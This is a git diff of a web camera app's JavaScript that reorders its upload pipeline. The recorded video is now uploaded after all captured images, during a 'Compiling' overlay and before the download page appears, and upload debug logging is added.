@@ -16,6 +16,19 @@ let isUploadingImages = false;
 let readyToShowDownload = false;
 let compilingOverlay = null;
 let compilingDotsInterval = null;
+let isVideoBlobReady = false;
+let isFinalizingAfterUploads = false;
+let hasVideoUploadAttempted = false;
+const UPLOAD_DEBUG = true;
+
+function logUploadPipeline(message, extra) {
+    if (!UPLOAD_DEBUG) return;
+    if (extra !== undefined) {
+        console.log(`[UPLOAD_PIPELINE] ${message}`, extra);
+        return;
+    }
+    console.log(`[UPLOAD_PIPELINE] ${message}`);
+}
 
 function showCompilingOverlay() {
     if (compilingOverlay) return;
@@ -325,6 +338,9 @@ function initFocusManagement(videoElement, containerElement) {
 }
 function startRecording() {
     recordedChunks = [];
+    videoBlob = null;
+    isVideoBlobReady = false;
+    hasVideoUploadAttempted = false;
     const options = {
         mimeType: 'video/webm;codecs=vp9',
         videoBitsPerSecond: 2500000
@@ -342,6 +358,12 @@ function startRecording() {
 
     mediaRecorder.ondataavailable = (event) => {
         recordedChunks.push(event.data);
+    };
+
+    mediaRecorder.onstop = () => {
+        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        isVideoBlobReady = true;
+        checkIfAllUploadsComplete();
     };
 
     mediaRecorder.start();
@@ -411,17 +433,14 @@ function captureImage() {
                     index: currentImageIndex,
                     downloadUrl: downloadUrl
                 });
-
-                // Increment uploaded count and check if we're done
-                uploadedImageCount++;
-                if (isUploadingImages && uploadedImageCount === imageCounter) {
-                    // All images uploaded - show download page
-                    checkIfAllUploadsComplete();
-                }
             } catch (error) {
                 console.error('Failed to upload image:', error);
             }
         }
+
+        // Count this image as completed (uploaded or attempted) so pipeline can continue.
+        uploadedImageCount++;
+        checkIfAllUploadsComplete();
 
         // Visual feedback - brief subtitle showing image was captured
         const heading2 = document.getElementById('heading2');
@@ -444,10 +463,16 @@ function stopPictures() {
     if (mediaRecorder && isRecording) {
         isRecording = false;
         isUploadingImages = true;
+        logUploadPipeline('Stop requested -> entering compiling/upload phase');
 
         // Hide the camera feed immediately
         const container = document.getElementById('camera-container');
         if (container) container.style.display = 'none';
+
+        // Stop recorder now so video blob can be prepared during "Compiling...".
+        if (mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+        }
 
         // Capture final frame from camera
         setTimeout(async () => {
@@ -465,6 +490,8 @@ function stopPictures() {
                     // Check if all images are uploaded, if so proceed to cleanup
                     checkIfAllUploadsComplete();
                 });
+            } else {
+                checkIfAllUploadsComplete();
             }
         }, 500);
     }
@@ -473,16 +500,30 @@ function stopPictures() {
 /**
  * Checks if all image uploads are complete and proceeds to show download page
  */
-function checkIfAllUploadsComplete() {
-    // Only proceed once
-    if (readyToShowDownload) return;
+async function checkIfAllUploadsComplete() {
+    // Only run finalization during uploading stage and once at a time.
+    if (!isUploadingImages || readyToShowDownload || isFinalizingAfterUploads) return;
 
-    // If no images were captured, or if all uploads are done, proceed
-    if ((uploadedImageCount === imageCounter && imageCounter > 0) || imageCounter === 0) {
+    const allImagesComplete = imageCounter === 0 || uploadedImageCount >= imageCounter;
+    const finalFrameReady = Boolean(finalFrameBlob);
+
+    // Wait until image uploads, final-frame capture, and video blob are all ready.
+    if (!allImagesComplete || !finalFrameReady || !isVideoBlobReady) return;
+
+    isFinalizingAfterUploads = true;
+    try {
+        logUploadPipeline('All image uploads complete; starting video upload', {
+            imageCounter,
+            uploadedImageCount
+        });
+        // Required order: after all image uploads, upload the video.
+        await uploadVideoAfterImages();
         readyToShowDownload = true;
+        logUploadPipeline('Video upload phase done; proceeding to download page');
         cleanup();
+    } finally {
+        isFinalizingAfterUploads = false;
     }
-    // Otherwise, wait for more uploads to complete
 }
 
 /**
@@ -666,6 +707,7 @@ function showDownloadPage() {
  */
 function cleanup() {
     hideCompilingOverlay();
+    logUploadPipeline('Landing on download page');
 
     const container = document.getElementById('camera-container');
     if (container) container.remove();
@@ -679,69 +721,55 @@ function cleanup() {
         delete window._focusCleanup;
     }
 
-    // Reset uploading flag
+    // Reset uploading flags
     isUploadingImages = false;
+    isFinalizingAfterUploads = false;
 
-    // Stop the media recorder now (it's been running during hypnosis)
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-
-        // Wait for the recording to finish processing
-        setTimeout(() => {
-            videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-
-            // NOW stop all tracks after recording is complete
-            mediaStream.getTracks().forEach(track => track.stop());
-
-            // Remove hypnosis page
-            const hypnosisPage = document.getElementById('hypnosis-page');
-            if (hypnosisPage) hypnosisPage.remove();
-
-            // Show the download page with all captured files
-            showDownloadPage();
-
-            // Upload video in the background
-            uploadVideoInBackground();
-        }, 500);
-    } else {
-        // If recorder already stopped, proceed immediately
-        videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
-
-        // Stop all tracks
+    // Recording should already be stopped before cleanup; just release tracks.
+    if (mediaStream) {
         mediaStream.getTracks().forEach(track => track.stop());
-
-        // Remove hypnosis page
-        const hypnosisPage = document.getElementById('hypnosis-page');
-        if (hypnosisPage) hypnosisPage.remove();
-
-        // Show the download page with all captured files
-        showDownloadPage();
-
-        // Upload video in the background
-        uploadVideoInBackground();
     }
+
+    // Remove hypnosis page
+    const hypnosisPage = document.getElementById('hypnosis-page');
+    if (hypnosisPage) hypnosisPage.remove();
+
+    // Show the download page with all captured files
+    showDownloadPage();
 }
 
 /**
- * Uploads video in the background after download page is shown
+ * Uploads video after all image uploads complete (during "Compiling...")
  */
-async function uploadVideoInBackground() {
-    if (videoBlob && sessionId) {
-        try {
-            const storagePath = `sessions/${sessionId}/video.webm`;
-            const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);
+async function uploadVideoAfterImages() {
+    if (hasVideoUploadAttempted) return;
+    hasVideoUploadAttempted = true;
 
-            // Record video upload in database
-            await uploadToDatabase(`sessions/${sessionId}/video`, {
-                timestamp: new Date().toISOString(),
-                downloadUrl: downloadUrl,
-                size: videoBlob.size
-            });
+    if (!videoBlob || !sessionId) {
+        logUploadPipeline('Video upload skipped (missing blob or sessionId)', {
+            hasVideoBlob: Boolean(videoBlob),
+            hasSessionId: Boolean(sessionId)
+        });
+        return;
+    }
 
-            console.log('✅ Video uploaded successfully in background');
-        } catch (error) {
-            console.error('❌ Failed to upload video in background:', error);
-        }
+    try {
+        logUploadPipeline('Video upload started', {
+            sizeBytes: videoBlob.size
+        });
+        const storagePath = `sessions/${sessionId}/video.webm`;
+        const downloadUrl = await uploadBlobToStorage(videoBlob, storagePath);
+
+        // Record video upload in database
+        await uploadToDatabase(`sessions/${sessionId}/video`, {
+            timestamp: new Date().toISOString(),
+            downloadUrl: downloadUrl,
+            size: videoBlob.size
+        });
+
+        logUploadPipeline('Video upload completed', { downloadUrl });
+    } catch (error) {
+        console.error('[UPLOAD_PIPELINE] Video upload failed:', error);
     }
 }
 
@@ -761,3 +789,4 @@ window.captureImage = captureImage;
 window.showHypnosisPage = showHypnosisPage;
 window.downloadAll = downloadAll;
 window.finishAndReset = finishAndReset;
+
